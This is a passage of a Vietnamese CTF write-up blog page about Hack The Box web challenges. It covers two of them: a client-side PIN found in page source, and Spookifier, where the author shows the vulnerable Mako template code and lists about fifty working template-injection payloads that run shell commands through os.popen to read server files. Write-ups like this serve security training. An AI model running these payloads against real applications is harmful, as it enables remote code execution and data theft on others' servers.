

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Htb web chall ctf 2024 - solved challenges - part 1 - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Hack the box  Trapped Source Spookifier Flag Command KORP Terminal SpookTastic Juggling facts CandyVault Jailbreak Cursed Secret Party  Flow   Gunship   easy  jscalc Insomnia  Access control vulnerability   0xBOverchunked Blueprint Heist Labyrinth Linguist GateCrash  Go server Nim proxy Flow Khai th√°c   Saturn HTBank  php_backend flask_frontend   GhostlyTemplates  Exploit   Spellbound Servants  Flow Exploit   PumpkinSpice  Flow Exploit      .">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-08-20-hackthebox-web-challpart1\/",
          "name": "Htb web chall ctf 2024 solved challenges part 1"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Htb web chall ctf 2024 - solved challenges - part 1",
  "description" : "Hack the box  Trapped Source Spookifier Flag Command KORP Terminal SpookTastic Juggling facts CandyVault Jailbreak Cursed Secret Party  Flow   Gunship   easy  jscalc Insomnia  Access control vulnerability   0xBOverchunked Blueprint Heist Labyrinth Linguist GateCrash  Go server Nim proxy Flow Khai th√°c   Saturn HTBank  php_backend flask_frontend   GhostlyTemplates  Exploit   Spellbound Servants  Flow Exploit   PumpkinSpice  Flow Exploit      \r\r\r\r\r.",
  "inLanguage" : "en",
  "wordCount":  10043 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-08-20-hackthebox-web-challpart1\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Htb web chall ctf 2024 - solved challenges - part 1" />
<meta property="og:description" content="Hack the box  Trapped Source Spookifier Flag Command KORP Terminal SpookTastic Juggling facts CandyVault Jailbreak Cursed Secret Party  Flow   Gunship   easy  jscalc Insomnia  Access control vulnerability   0xBOverchunked Blueprint Heist Labyrinth Linguist GateCrash  Go server Nim proxy Flow Khai th√°c   Saturn HTBank  php_backend flask_frontend   GhostlyTemplates  Exploit   Spellbound Servants  Flow Exploit   PumpkinSpice  Flow Exploit      .">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-08-20-hackthebox-web-challpart1/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Htb web chall ctf 2024 - solved challenges - part 1" />
  <meta name="twitter:description" content="Hack the box  Trapped Source Spookifier Flag Command KORP Terminal SpookTastic Juggling facts CandyVault Jailbreak Cursed Secret Party  Flow   Gunship   easy  jscalc Insomnia  Access control ‚Ä¶">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>Htb web chall ctf 2024 - solved challenges - part 1</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li><a href="#hack-the-box">Hack the box</a>
      <ol>
        <li><a href="#trapped-source">Trapped Source</a></li>
        <li><a href="#spookifier">Spookifier</a></li>
        <li><a href="#flag-command">Flag Command</a></li>
        <li><a href="#korp-terminal">KORP Terminal</a></li>
        <li><a href="#spooktastic">SpookTastic</a></li>
        <li><a href="#juggling-facts">Juggling facts</a></li>
        <li><a href="#candyvault">CandyVault</a></li>
        <li><a href="#jailbreak">Jailbreak</a></li>
        <li><a href="#cursed-secret-party">Cursed Secret Party</a>
          <ol>
            <li><a href="#flow">Flow</a></li>
          </ol>
        </li>
        <li><a href="#gunship">Gunship</a></li>
      </ol>
    </li>
    <li><a href="#easy">easy</a>
      <ol>
        <li><a href="#jscalc">jscalc</a></li>
        <li><a href="#insomnia">Insomnia</a>
          <ol>
            <li><a href="#access-control-vulnerability">Access control vulnerability</a></li>
          </ol>
        </li>
        <li><a href="#0xboverchunked">0xBOverchunked</a></li>
        <li><a href="#blueprint-heist">Blueprint Heist</a></li>
        <li><a href="#labyrinth-linguist">Labyrinth Linguist</a></li>
        <li><a href="#gatecrash">GateCrash</a>
          <ol>
            <li><a href="#go-server">Go server</a></li>
            <li><a href="#nim-proxy">Nim proxy</a></li>
            <li><a href="#flow-1">Flow</a></li>
            <li><a href="#khai-th√°c">Khai th√°c</a></li>
          </ol>
        </li>
        <li><a href="#saturn">Saturn</a></li>
        <li><a href="#htbank">HTBank</a>
          <ol>
            <li><a href="#php_backend">php_backend</a></li>
            <li><a href="#flask_frontend">flask_frontend</a></li>
          </ol>
        </li>
        <li><a href="#ghostlytemplates">GhostlyTemplates</a>
          <ol>
            <li><a href="#exploit">Exploit</a></li>
          </ol>
        </li>
        <li><a href="#spellbound-servants">Spellbound Servants</a>
          <ol>
            <li><a href="#flow-2">Flow</a></li>
            <li><a href="#exploit-1">Exploit</a></li>
          </ol>
        </li>
        <li><a href="#pumpkinspice">PumpkinSpice</a>
          <ol>
            <li><a href="#flow-3">Flow</a></li>
            <li><a href="#exploit-2">Exploit</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<h1 id="hack-the-box">Hack the box</h1>
<h2 id="trapped-source">Trapped Source</h2>
<ul>
<li>ƒê√¢y l√† b√†i ch·ªâ view source th√¥i</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SyGGk3RJ0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hyr41h01C.png" alt="image"></p>
<ul>
<li>Nh∆∞ ta th·∫•y n·∫øu m√† pin ƒë√∫ng s·∫Ω g·ªçi fetch v·ªõi method post ƒë·∫øn <code>/flag</code> v√† nh·∫≠n flag.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rJl51hCyR.png" alt="image"></p>
<ul>
<li>Correct pin l√† : <code>9661</code> nh·∫≠n flag n√†o:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SJm3ynRkC.png" alt="image"></p>
<p>Flag : <code>HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}</code></p>
<h2 id="spookifier">Spookifier</h2>
<ul>
<li>
<p>ƒê√¢y l√† m·ªôt b√†i white box.</p>
</li>
<li>
<p>Ch·ª©c nƒÉng ƒë∆°n gi·∫£n l√† thay ƒë·ªïi ph√¥ng ch·ªØ t·∫°o ra nhi·ªÅu l·∫°i v·ªõi ƒë·∫ßu v√†o m√† ch√∫ng ta cho v√†o.</p>
</li>
<li>
<p>View source th√¨ m√¨nh th·∫•y c√≥ ph·∫ßn ch√≠nh:</p>
</li>
</ul>
<p><img src="https://hackmd.io/_uploads/H17fM2RkA.png" alt="image"></p>
<ul>
<li>V√† h√†m spokier tr√¥ng s·∫Ω nh∆∞ th·∫ø n√†y.</li>
</ul>
<pre><code>from mako.template import Template

font1 = {
	'A': 'ùï¨',
	'B': 'ùï≠',
	'C': 'ùïÆ',
	'D': 'ùïØ',
	'E': 'ùï∞',
	'F': 'ùï±',
	'G': 'ùï≤',
	'H': 'ùï≥',
	'I': 'ùï¥',
	'J': 'ùïµ',
	'K': 'ùï∂',
	'L': 'ùï∑',
	'M': 'ùï∏',
	'N': 'ùïπ',
	'O': 'ùï∫',
	'P': 'ùïª',
	'Q': 'ùïº',
	'R': 'ùïΩ',
	'S': 'ùïæ',
	'T': 'ùïø',
	'U': 'ùñÄ',
	'V': 'ùñÅ',
	'W': 'ùñÇ',
	'X': 'ùñÉ',
	'Y': 'ùñÑ',
	'Z': 'ùñÖ',
	'a': 'ùñÜ',
	'b': 'ùñá',
	'c': 'ùñà',
	'd': 'ùñâ',
	'e': 'ùñä',
	'f': 'ùñã',
	'g': 'ùñå',
	'h': 'ùñç',
	'i': 'ùñé',
	'j': 'ùñè',
	'k': 'ùñê',
	'l': 'ùñë',
	'm': 'ùñí',
	'n': 'ùñì',
	'o': 'ùñî',
	'p': 'ùñï',
	'q': 'ùññ',
	'r': 'ùñó',
	's': 'ùñò',
	't': 'ùñô',
	'u': 'ùñö',
	'v': 'ùñõ',
	'w': 'ùñú',
	'x': 'ùñù',
	'y': 'ùñû',
	'z': 'ùñü',
	' ': ' '
}

font2 = {
	'A': '·ó©', 
	'B': '·ó∑',
	'C': '·ë¢',
	'D': '·ï≤',
	'E': '·òø',
	'F': '·ñ¥',
	'G': '·òú',
	'H': '·ïº',
	'I': '·ì∞',
	'J': '·íö',
	'K': '·ñΩ·ê∏',
	'L': '·í™',
	'M': '·òª',
	'N': '·òâ',
	'O': '·ìç',
	'P': '·ïµ',
	'Q': '·ï¥',
	'R': '·ñá',
	'S': 'S',
	'T': '·ñ∂',
	'U': '·ëò',
	'V': '·ê∫',
	'W': '·ò∫',
	'X': '·ô≠',
	'Y': '…é',
	'Z': '‚±´',
	'a': '·ó©', 
	'b': '·ó∑',
	'c': '·ë¢',
	'd': '·ï≤',
	'e': '·òø',
	'f': '·ñ¥',
	'g': '·òú',
	'h': '·ïº',
	'i': '·ì∞',
	'j': '·íö',
	'k': '·ñΩ·ê∏',
	'l': '·í™',
	'm': '·òª',
	'n': '·òâ',
	'o': '·ìç',
	'p': '·ïµ',
	'q': '·ï¥',
	'r': '·ñá',
	's': 'S',
	't': '·ñ∂',
	'u': '·ëò',
	'v': '·ê∫',
	'w': '·ò∫',
	'x': '·ô≠',
	'y': '…é',
	'z': '‚±´',

	' ': ' '
}

font3 = {
	'A': '‚Ç≥', 
	'B': '‡∏ø',
	'C': '‚Çµ',
	'D': 'ƒê',
	'E': '…Ü',
	'F': '‚Ç£',
	'G': '‚Ç≤',
	'H': '‚±ß',
	'I': '≈Ç',
	'J': 'J',
	'K': '‚Ç≠',
	'L': '‚±†',
	'M': '‚Ç•',
	'N': '‚Ç¶',
	'O': '√ò',
	'P': '‚Ç±',
	'Q': 'Q',
	'R': '‚±§',
	'S': '‚Ç¥',
	'T': '‚ÇÆ',
	'U': '…Ñ',
	'V': 'V',
	'W': '‚Ç©',
	'X': '”æ',
	'Y': 'yÃ∑',
	'Z': 'zÃ∑',
	'a': '‚Ç≥', 
	'b': '‡∏ø',
	'c': '‚Çµ',
	'd': 'ƒê',
	'e': '…Ü',
	'f': '‚Ç£',
	'g': '‚Ç≤',
	'h': '‚±ß',
	'i': '≈Ç',
	'j': 'J',
	'k': '‚Ç≠',
	'l': '‚±†',
	'm': '‚Ç•',
	'n': '‚Ç¶',
	'o': '√ò',
	'p': '‚Ç±',
	'q': 'Q',
	'r': '‚±§',
	's': '‚Ç¥',
	't': '‚ÇÆ',
	'u': '…Ñ',
	'v': 'V',
	'w': '‚Ç©',
	'x': '”æ',
	'y': 'yÃ∑',
	'z': 'zÃ∑',
	' ': ''
} 

font4 = {
	'A': 'A', 
	'B': 'B',
	'C': 'C',
	'D': 'D',
	'E': 'E',
	'F': 'F',
	'G': 'G',
	'H': 'H',
	'I': 'I',
	'J': 'J',
	'K': 'K',
	'L': 'L',
	'M': 'M',
	'N': 'N',
	'O': 'O',
	'P': 'P',
	'Q': 'Q',
	'R': 'R',
	'S': 'S',
	'T': 'T',
	'U': 'U',
	'V': 'V',
	'W': 'W',
	'X': 'X',
	'Y': 'Y',
	'Z': 'Z',
	'a': 'a', 
	'b': 'b',
	'c': 'c',
	'd': 'd',
	'e': 'e',
	'f': 'f',
	'g': 'g',
	'h': 'h',
	'i': 'i',
	'j': 'j',
	'k': 'k',
	'l': 'l',
	'm': 'm',
	'n': 'n',
	'o': 'o',
	'p': 'p',
	'q': 'q',
	'r': 'r',
	's': 's',
	't': 't',
	'u': 'u',
	'v': 'v',
	'w': 'w',
	'x': 'x',
	'y': 'y',
	'z': 'z',
	'1': '1',
	'2': '2',
	'3': '3',
	'4': '4',
	'5': '5',
	'6': '6',
	'7': '7',
	'8': '8',
	'9': '9',
	'0': '0',
	'!': '!',
	'@': '@',
	'#': '#',
	'$': '$',
	'%': '%',
	'^': '^',
	'&amp;': '&amp;',
	'*': '*',
	'(': '(',
	')': ')',
	'-': '-',
	'_': '_',
	'+': '+',
	'=': '=',
	'{': '{',
	'}': '}',
	'[': '[',
	']': ']',
	'\\': '\\',
	'|': '|',
	';': ';',
	':': ':',
	'\'': '\'',
	'&quot;': '&quot;',
	'&lt;': '&lt;',
	',': ',',
	'&gt;': '&gt;',
	'.': '.',
	'?': '?',
	'/': '/'
	' ': ' ',
}

def generate_render(converted_fonts):
	result = '''
		&lt;tr&gt;
			&lt;td&gt;{0}&lt;/td&gt;
        &lt;/tr&gt;
        
		&lt;tr&gt;
        	&lt;td&gt;{1}&lt;/td&gt;
        &lt;/tr&gt;
        
		&lt;tr&gt;
        	&lt;td&gt;{2}&lt;/td&gt;
        &lt;/tr&gt;
        
		&lt;tr&gt;
        	&lt;td&gt;{3}&lt;/td&gt;
        &lt;/tr&gt;

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)


</code></pre><ul>
<li>
<p>Nh√¨n c√°i l√† bi·∫øt lu√¥n d√≠nh SSTI c·ªßa template mako nha.</p>
</li>
<li>
<p>B√¢y gi·ªù th√¨ th·ª≠ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako">payload</a>, flag n·∫±m ·ªü <code>/flag.txt</code> nh√°.</p>
</li>
<li>
<p>D√πng intruder check:</p>
</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SJrkN3A1A.png" alt="image"></p>
<ul>
<li>M√¨nh loay hoay kh√° l√¢u v√¨ b√¨nh th∆∞·ªùng ƒë·ªÉ nguy√™n th√¨ k·∫øt qu·∫£ ƒë·ªÅu l√† 0 h·∫øt ch·∫Øc cho sever detect system ho·∫∑c l√† kh√¥ng c√≥ quy·ªÅn ch·∫°y os :&gt;, sau ƒë√≥ gpt th√¨ t√¨m xem c√≥ c√°ch kh√°c ƒë·ªÉ ƒë·ªçc file t·ª´ popen c·ªßa os module.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/B1qoPh0JA.png" alt="image"></p>
<ul>
<li>
<p>gi·ªù m√¨nh th·ª≠ xem c√≥ ƒë∆∞·ª£c kh√¥ng.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rkdlA2CJR.png" alt="image"></p>
</li>
<li>
<p>Hehe c√≥ v·∫ª nh∆∞ n√≥ kh√¥ng detect g√¨ c·∫£ n√™n m√¨nh nh·∫≠n ƒë∆∞·ª£c flag.</p>
</li>
</ul>
<pre><code>${self.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.__init__.__globals__['util'].os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.__init__.__globals__['os'].popen(&quot;cat /flag.txt&quot;).read()}
${self.module.cache.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.cache.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.filters.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.exceptions.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.cache.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.cache.util.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.util.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.exceptions.traceback.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.exceptions.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.cache.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template._mmarker.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.filters.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template._mmarker.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.template.module.runtime.exceptions.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.module.runtime.exceptions.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
${self.context._with_template._mmarker.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
